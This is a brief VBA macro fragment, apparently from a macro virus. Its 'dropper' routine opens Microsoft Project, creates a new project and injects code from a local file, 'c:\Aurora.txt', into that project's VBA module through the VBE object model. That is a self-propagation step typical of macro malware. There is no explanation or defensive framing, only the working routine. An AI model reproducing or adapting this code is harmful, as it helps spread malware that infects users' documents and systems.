Call dropper

sub dropper()
set projobj=CreateObject("MSProject.Application")
Set proj1obj=projobj.Projects.Add
projobj.vbe.VBProjects(1).VBComponents(1).Codemodule.AddFromFile "c:\Aurora.txt"

end sub